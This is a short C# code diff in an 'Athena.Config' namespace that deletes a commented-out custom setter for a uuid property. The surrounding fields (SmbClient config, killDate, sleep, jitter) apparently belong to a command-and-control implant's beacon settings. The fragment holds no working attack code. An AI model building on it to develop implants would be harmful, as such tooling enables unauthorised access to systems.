@@ -16,16 +16,6 @@ namespace Athena.Config
     {
         public SmbClient currentConfig { get; set; }
         public string uuid { get; set; }
-        //public string uuid
-        //{
-        //    get { return uuid; }
-        //    set
-        //    {
-        //        //Custom Setter to update the SmbClient too
-        //        this.uuid = value;
-        //        this.currentConfig.uuid = value;
-        //    }
-        //}
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
